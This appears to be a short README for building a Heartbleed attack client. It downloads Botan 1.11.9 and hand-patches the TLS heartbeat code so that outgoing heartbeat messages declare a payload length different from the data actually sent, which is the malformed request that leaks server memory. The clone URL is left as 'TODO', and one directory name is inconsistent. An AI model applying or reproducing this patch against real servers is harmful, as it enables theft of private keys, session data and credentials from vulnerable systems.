# Botan
- tested version: 1.11.9
- download here: http://files.randombit.net/botan/Botan-1.11.9.tgz
- tar xfvz Botan-1.11.9.tgz
- cd Botan-1.11.9/
- apply the following changes (no patchfiles sorry)
  - src/lib/tls/tls_policy.h:81 replace with:
    > virtual bool negotiate_heartbeat_support() const { return true; }
  - src/lib/tls/tls_heartbeats.h add a new private member:
    > size_t m_payload_len;
  - src/lib/tls/tls_heartbeats.cpp: ADD to constructor of 'Heartbeat_Message'
    > m_payload_len(payload_len)
  - src/lib/tls/tls_heartbeats.cpp: REMOVE the initialization of m_payload in the constructor of 'Heartbeat_Message'
    > m_payload(payload, payload + payload_len)
  - replace
    > send_buf[1] = get_byte<u16bit>(0, m_payload.size());
    > send_buf[2] = get_byte<u16bit>(1, m_payload.size());
    with
    > send_buf[1] = get_byte<u16bit>(0, m_payload_len);
    > send_buf[2] = get_byte<u16bit>(1, m_payload_len);
- ./configure --prefix=/your/install/prefix/here (in my case '/opt/heartbleed')
- make
- make install
- git clone TODO
- mv heartbleed heartblead_src
- mkdir heartbleed
- cd heartbleed
- cmake ../heartbleed_src
- make
